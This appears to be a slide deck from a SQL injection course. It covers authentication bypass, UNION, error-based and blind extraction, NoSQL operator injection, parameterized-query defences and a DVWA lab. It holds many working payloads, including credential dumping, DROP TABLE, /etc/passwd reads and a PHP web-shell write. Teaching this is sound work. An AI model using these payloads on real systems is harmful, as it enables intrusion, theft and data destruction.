# SQL Injection Basics

## The Most Dangerous Web Vulnerability

---

## What is SQL Injection?

`SQL injection` occurs when user input is included in a `SQL` query without proper sanitization, allowing attackers to modify the query's logic.

```sql
-- Application code (PHP)
$query = "SELECT * FROM users WHERE username='"
         . $_POST['username']
         . "' AND password='"
         . $_POST['password'] . "'";

-- Normal input: username=john, password=secret
SELECT * FROM users WHERE username='john' AND password='secret'

-- Malicious input: username=admin'--, password=anything
SELECT * FROM users WHERE username='admin'--' AND password='anything'
-- Everything after -- is a comment!
-- Query becomes: SELECT * FROM users WHERE username='admin'
```

---

## Impact of SQL Injection

| Impact | Description |
|--------|-------------|
| **Authentication Bypass** | Log in as any user without password |
| **Data Theft** | Extract entire database contents |
| **Data Modification** | Insert, update, delete records |
| **Privilege Escalation** | Gain admin access |
| **Remote Code Execution** | Execute OS commands via database |
| **Denial of Service** | Drop tables, corrupt data |
| **Lateral Movement** | Pivot to other systems via DB links |

> SQL injection has been #1 on OWASP Top 10 for over a decade

---

## SQL Injection Types

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="240" viewBox="0 0 660 240">
  <rect width="660" height="240" fill="#f0f4f8" rx="4" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="24" font-family="sans-serif" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">SQL Injection Types</text>
  <!-- In-Band -->
  <rect x="20" y="40" width="190" height="90" fill="#e3f2fd" rx="4" stroke="#1565c0" stroke-width="1.5"/>
  <text x="115" y="62" font-family="sans-serif" font-size="13" font-weight="bold" fill="#1565c0" text-anchor="middle">In-Band (Classic)</text>
  <text x="115" y="82" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">Error-based:</text>
  <text x="115" y="98" font-family="sans-serif" font-size="11" fill="#555" text-anchor="middle">Use error messages to</text>
  <text x="115" y="113" font-family="sans-serif" font-size="11" fill="#555" text-anchor="middle">extract data</text>
  <text x="115" y="128" font-family="sans-serif" font-size="11" fill="#555" text-anchor="middle">UNION-based: combine results</text>
  <!-- Blind -->
  <rect x="235" y="40" width="190" height="90" fill="#fff3e0" rx="4" stroke="#e65100" stroke-width="1.5"/>
  <text x="330" y="62" font-family="sans-serif" font-size="13" font-weight="bold" fill="#e65100" text-anchor="middle">Blind</text>
  <text x="330" y="82" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">Boolean-based:</text>
  <text x="330" y="98" font-family="sans-serif" font-size="11" fill="#555" text-anchor="middle">Ask true/false questions</text>
  <text x="330" y="118" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">Time-based:</text>
  <text x="330" y="132" font-family="sans-serif" font-size="11" fill="#555" text-anchor="middle">Use delays to infer data</text>
  <!-- Out-of-Band -->
  <rect x="450" y="40" width="190" height="90" fill="#e8f5e9" rx="4" stroke="#2e7d32" stroke-width="1.5"/>
  <text x="545" y="62" font-family="sans-serif" font-size="13" font-weight="bold" fill="#2e7d32" text-anchor="middle">Out-of-Band</text>
  <text x="545" y="85" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">DNS exfiltration</text>
  <text x="545" y="105" font-family="sans-serif" font-size="12" fill="#222" text-anchor="middle">HTTP requests from DB</text>
  <text x="330" y="165" font-family="sans-serif" font-size="12" fill="#555" text-anchor="middle">Increasing order of stealth: In-Band → Blind → Out-of-Band</text>
</svg>

---

## Finding SQL Injection - Step 1: Identify Input Points

```misc
Every user input that reaches a SQL query is a potential target:

URL Parameters:     /products?id=1
Form Fields:        username, password, search, email
HTTP Headers:       Cookie, User-Agent, Referer, X-Forwarded-For
JSON/XML Bodies:    {"id": 1, "name": "test"}
REST Path Params:   /api/users/123
```

---

## Finding SQL Injection - Step 2: Test with Probes

```sql
-- String-based injection probes
'              -- Single quote (most common)
"              -- Double quote
''             -- Escaped single quote
\              -- Backslash
' OR '1'='1    -- Always true condition
' OR '1'='2    -- Always false condition
' AND '1'='1   -- True condition (should work like normal)
'; --          -- Terminate query, comment rest

-- Numeric injection probes
1 OR 1=1       -- Always true
1 AND 1=2      -- Always false (should return nothing)
1+1            -- Arithmetic (if result changes, injectable)
1-0            -- Should behave same as 1

-- Error-inducing probes
' OR ''='      -- Syntax check
1'             -- Mismatched quote
```

---

## Recognizing SQL Injection Responses

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="300" viewBox="0 0 660 300">
  <rect width="660" height="300" fill="#f0f4f8" rx="4" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="24" font-family="sans-serif" font-size="15" font-weight="bold" fill="#222" text-anchor="middle">SQL Injection — Positive Indicators</text>
  <!-- row 1 -->
  <rect x="20" y="40" width="620" height="48" fill="#ffebee" rx="4" stroke="#c62828" stroke-width="1"/>
  <text x="35" y="60" font-family="sans-serif" font-size="13" font-weight="bold" fill="#c62828">1. Database error messages</text>
  <text x="35" y="78" font-family="monospace" font-size="11" fill="#555">"You have an error in your SQL syntax..." / "ORA-01756: quoted string not properly terminated"</text>
  <!-- row 2 -->
  <rect x="20" y="96" width="620" height="36" fill="#fff3e0" rx="4" stroke="#e65100" stroke-width="1"/>
  <text x="35" y="116" font-family="sans-serif" font-size="13" font-weight="bold" fill="#e65100">2. Behavior differs: single quote (') causes error, two singles ('') do not</text>
  <!-- row 3 -->
  <rect x="20" y="140" width="620" height="48" fill="#e8f5e9" rx="4" stroke="#2e7d32" stroke-width="1"/>
  <text x="35" y="160" font-family="sans-serif" font-size="13" font-weight="bold" fill="#2e7d32">3. Boolean differences</text>
  <text x="35" y="178" font-family="monospace" font-size="11" fill="#555">id=1 AND 1=1 → normal   |   id=1 AND 1=2 → different/empty response</text>
  <!-- row 4 -->
  <rect x="20" y="196" width="620" height="36" fill="#e3f2fd" rx="4" stroke="#1565c0" stroke-width="1"/>
  <text x="35" y="214" font-family="sans-serif" font-size="13" font-weight="bold" fill="#1565c0">4. Time delays</text>
  <text x="35" y="229" font-family="monospace" font-size="11" fill="#555">  id=1; WAITFOR DELAY '0:0:5'--  →  5 second delay</text>
  <!-- row 5 -->
  <rect x="20" y="240" width="620" height="36" fill="#f3e5f5" rx="4" stroke="#7b1fa2" stroke-width="1"/>
  <text x="35" y="258" font-family="sans-serif" font-size="13" font-weight="bold" fill="#7b1fa2">5. Arithmetic evaluation</text>
  <text x="35" y="273" font-family="monospace" font-size="11" fill="#555">  id=2-1  →  same as id=1  (input is being evaluated as SQL)</text>
</svg>

---

## How Parameterized Queries Prevent SQLi

```sql
-- WITHOUT parameterized queries:
-- User input becomes PART OF the SQL code
query = "SELECT * FROM users WHERE id = '" + input + "'"
-- input = "1' OR '1'='1"
-- Result: SELECT * FROM users WHERE id = '1' OR '1'='1'
-- The input CHANGED the query structure!

-- WITH parameterized queries:
-- User input is ALWAYS treated as data, never as code
query = "SELECT * FROM users WHERE id = ?"
-- Parameter: "1' OR '1'='1"
-- Result: SELECT * FROM users WHERE id = '1'' OR ''1''=''1'
-- The database treats the ENTIRE input as a string value
-- The query structure CANNOT be changed

-- This is why parameterized queries are the #1 defense
-- The SQL engine processes the query structure FIRST
-- Then binds the parameters as data values
-- Input can NEVER become SQL code
```

---

## Authentication Bypass via SQL Injection

```sql
-- Login query
SELECT * FROM users WHERE username='INPUT' AND password='INPUT'

-- Bypass 1: Comment out password check
Username: admin'--
Password: anything
Result: SELECT * FROM users WHERE username='admin'--' AND password='anything'

-- Bypass 2: Always true condition
Username: ' OR 1=1--
Password: anything
Result: SELECT * FROM users WHERE username='' OR 1=1--' AND password='anything'
-- Returns ALL users (first user is often admin)

-- Bypass 3: UNION-based login bypass
Username: ' UNION SELECT 1,'admin','admin_pass_hash'--
Password: anything
```

---

## Error-Based SQL Injection

```sql
-- MySQL: Extract data through error messages
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
-- Error: XPATH syntax error: '~5.7.34~'

-- MSSQL: Convert error
' AND 1=CONVERT(int, (SELECT @@version))--
-- Error: Conversion failed: "Microsoft SQL Server 2019..."

-- PostgreSQL: Cast error
' AND 1=CAST((SELECT version()) AS int)--
-- Error: invalid input syntax for integer: "PostgreSQL 13.4..."

-- Oracle: UTL_INADDR
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--
```

---

## Database Fingerprinting

```sql
-- Each database has unique syntax and functions

-- Version detection:
MySQL:       SELECT @@version      or  SELECT version()
PostgreSQL:  SELECT version()
MSSQL:       SELECT @@version
Oracle:      SELECT banner FROM v$version WHERE ROWNUM=1
SQLite:      SELECT sqlite_version()

-- String concatenation:
MySQL:       SELECT CONCAT('a','b')  or  'a' 'b'
PostgreSQL:  SELECT 'a' || 'b'
MSSQL:       SELECT 'a' + 'b'
Oracle:      SELECT 'a' || 'b'

-- Comments:
MySQL:       -- (space), #, /* */
PostgreSQL:  --, /* */
MSSQL:       --, /* */
Oracle:      --, /* */
```

---

## Determining Number of Columns

```sql
-- Method 1: ORDER BY (increment until error)
' ORDER BY 1--     (works)
' ORDER BY 2--     (works)
' ORDER BY 3--     (works)
' ORDER BY 4--     (ERROR! -> table has 3 columns)

-- Method 2: UNION SELECT with NULLs
' UNION SELECT NULL--              (error -> not 1 column)
' UNION SELECT NULL,NULL--         (error -> not 2 columns)
' UNION SELECT NULL,NULL,NULL--    (success! -> 3 columns)

-- Method 3: UNION SELECT with numbers
' UNION SELECT 1,2,3--
-- Numbers that appear in the page show which columns
-- are reflected in the output (display columns)
```

---

## UNION-Based Data Extraction

```sql
-- Step 1: Find number of columns (say 3)
' ORDER BY 3-- (works)
' ORDER BY 4-- (error)

-- Step 2: Find display columns
' UNION SELECT 1,2,3--
-- If "2" appears on page, column 2 is displayed

-- Step 3: Extract database version
' UNION SELECT 1,version(),3--

-- Step 4: List all databases
' UNION SELECT 1,GROUP_CONCAT(schema_name),3
  FROM information_schema.schemata--

-- Step 5: List tables in target database
' UNION SELECT 1,GROUP_CONCAT(table_name),3
  FROM information_schema.tables WHERE table_schema='targetdb'--

-- Step 6: List columns in target table
' UNION SELECT 1,GROUP_CONCAT(column_name),3
  FROM information_schema.columns WHERE table_name='users'--

-- Step 7: Extract data
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
```

---

## Practical Example: DVWA SQL Injection

<svg xmlns="http://www.w3.org/2000/svg" width="660" height="300" viewBox="0 0 660 300">
  <rect width="660" height="300" fill="#f0f4f8" rx="4" stroke="#333" stroke-width="1.5"/>
  <text x="330" y="24" font-family="sans-serif" font-size="14" font-weight="bold" fill="#222" text-anchor="middle">DVWA SQL Injection — Step-by-Step (Security: Low)</text>
  <text x="330" y="42" font-family="monospace" font-size="11" fill="#555" text-anchor="middle">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</text>
  <!-- steps -->
  <rect x="20" y="56" width="30" height="30" fill="#1565c0" rx="4"/>
  <text x="35" y="76" font-family="sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">1</text>
  <text x="60" y="70" font-family="sans-serif" font-size="13" font-weight="bold" fill="#333">Test for injection</text>
  <text x="60" y="85" font-family="monospace" font-size="11" fill="#c62828">id=1'  →  Error (injectable!)</text>
  <rect x="20" y="100" width="30" height="30" fill="#1565c0" rx="4"/>
  <text x="35" y="120" font-family="sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">2</text>
  <text x="60" y="114" font-family="sans-serif" font-size="13" font-weight="bold" fill="#333">Determine number of columns</text>
  <text x="60" y="129" font-family="monospace" font-size="11" fill="#555">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</text>
  <rect x="20" y="148" width="30" height="30" fill="#1565c0" rx="4"/>
  <text x="35" y="168" font-family="sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">3</text>
  <text x="60" y="162" font-family="sans-serif" font-size="13" font-weight="bold" fill="#333">Find display columns</text>
  <text x="60" y="177" font-family="monospace" font-size="11" fill="#555">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</text>
  <rect x="20" y="196" width="30" height="30" fill="#1565c0" rx="4"/>
  <text x="35" y="216" font-family="sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">4</text>
  <text x="60" y="210" font-family="sans-serif" font-size="13" font-weight="bold" fill="#333">Extract DB version</text>
  <text x="60" y="225" font-family="monospace" font-size="11" fill="#555">id=' UNION SELECT 1,@@version-- -</text>
  <rect x="20" y="244" width="30" height="30" fill="#c62828" rx="4"/>
  <text x="35" y="264" font-family="sans-serif" font-size="14" font-weight="bold" fill="#fff" text-anchor="middle">5</text>
  <text x="60" y="258" font-family="sans-serif" font-size="13" font-weight="bold" fill="#c62828">Dump user credentials</text>
  <text x="60" y="273" font-family="monospace" font-size="11" fill="#c62828">id=' UNION SELECT user,password FROM users-- -</text>
</svg>

---

## Boolean-Based Blind Injection

```sql
-- When no output is visible, use true/false responses

-- Test: Does the first character of the version start with '5'?
id=1 AND SUBSTRING(@@version,1,1)='5'
-- If page loads normally -> TRUE (version starts with 5)
-- If page is empty/different -> FALSE

-- Extract data character by character:
id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'
id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='b'
...continue through alphabet...

-- Optimize with binary search on ASCII values:
id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>109
-- If TRUE, character is 'n' through 'z'
-- If FALSE, character is 'a' through 'm'
-- Continue halving the range
```

---

## Time-Based Blind Injection

```sql
-- When there's no visible difference in responses
-- Use time delays to infer true/false

-- MySQL
id=1 AND IF(1=1, SLEEP(5), 0)--
-- If 5-second delay -> condition is TRUE

-- Extract data via timing
id=1 AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--
-- 5-second delay means version starts with '5'

-- MSSQL
id=1; IF (1=1) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
id=1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQLite
id=1 AND CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END
```

---

## Common SQL Injection Payloads

```sql
-- Authentication bypass
admin'--
' OR 1=1--
' OR 'a'='a
') OR ('1'='1
admin' /*

-- UNION-based extraction
' UNION SELECT username,password FROM users--
' UNION ALL SELECT NULL,NULL,NULL--

-- Stacked queries (if supported)
'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','hacked');--

-- Reading files (MySQL)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

-- Writing files (MySQL)
' UNION SELECT 1,'<?php system($_GET["cmd"]);?>',3
  INTO OUTFILE '/var/www/html/shell.php'--
```

---

## SQL Injection in Different Contexts

```sql
-- In WHERE clause (most common)
SELECT * FROM users WHERE id='INJECTION'

-- In INSERT statement
INSERT INTO logs VALUES('INJECTION', now())
-- Payload: test'); DROP TABLE logs;--

-- In UPDATE statement
UPDATE users SET email='INJECTION' WHERE id=1
-- Payload: hacker@evil.com', role='admin' WHERE id=1--

-- In ORDER BY clause
SELECT * FROM products ORDER BY INJECTION
-- Payload: (CASE WHEN (1=1) THEN name ELSE price END)

-- In LIMIT clause
SELECT * FROM products LIMIT INJECTION
-- Payload: 1 UNION SELECT 1,2,3--

-- In column/table names (rare but possible)
SELECT INJECTION FROM users
```

---

## NoSQL Injection

```javascript
// MongoDB NoSQL injection
// VULNERABLE Node.js code
app.post('/login', (req, res) => {
    db.collection('users').findOne({
        username: req.body.username,
        password: req.body.password
    }, (err, user) => {
        if (user) res.send('Welcome!');
        else res.send('Invalid');
    });
});

// Attack: Send JSON with MongoDB operators
// POST /login
// Content-Type: application/json
// {"username":"admin","password":{"$gt":""}}
// $gt:"" matches ANY non-empty password!

// Other operators:
// {"$ne": ""}     -> Not equal to empty (matches all)
// {"$regex":".*"} -> Matches everything
// {"$exists":true} -> Field exists

// Defense: Validate input types, use mongoose schemas
// Ensure strings are strings, not objects
if (typeof req.body.password !== 'string') {
    return res.status(400).send('Invalid input');
}
```

---

## SQL Injection Cheat Sheet

```sql
-- Quick reference for common SQL injection tasks

-- CONCAT alternatives:
MySQL:    CONCAT('a','b')  |  'a' 'b'
MSSQL:    'a' + 'b'
Oracle:   'a' || 'b'
Postgres: 'a' || 'b'

-- Substring:
MySQL:    SUBSTRING(str,pos,len) | SUBSTR(str,pos,len)
MSSQL:    SUBSTRING(str,pos,len)
Oracle:   SUBSTR(str,pos,len)

-- IF/CASE:
MySQL:    IF(cond, true_val, false_val)
MSSQL:    CASE WHEN cond THEN true_val ELSE false_val END
Oracle:   CASE WHEN cond THEN true_val ELSE false_val END

-- Current user:
MySQL:    user() | current_user()
MSSQL:    SYSTEM_USER | CURRENT_USER
Oracle:   user | SYS_CONTEXT('USERENV','SESSION_USER')
Postgres: current_user

-- Comment:
MySQL:    -- (space) | # | /* */
Others:   -- | /* */
```

---

## Lab Exercise: DVWA SQL Injection

Security Level: **Low**

1. Test `id` parameter for injection with `'`
1. Determine the number of columns
1. Find which columns are displayed
1. Extract the MySQL version
1. List all databases
1. List all tables in the `dvwa` database
1. Extract all usernames and password hashes

```misc
Target URL:
http://localhost:8080/vulnerabilities/sqli/?id=INJECT&Submit=Submit
```

---

## Summary

- `SQL injection` allows attackers to manipulate database queries
- Always test string and numeric parameters
- Error messages reveal database type and structure
- `UNION SELECT` enables direct data extraction
- Blind injection works when no output is visible
- Time-based injection is the slowest but most reliable
- `information_schema` is the key to mapping databases

> Tomorrow: Advanced SQL Injection & Automation
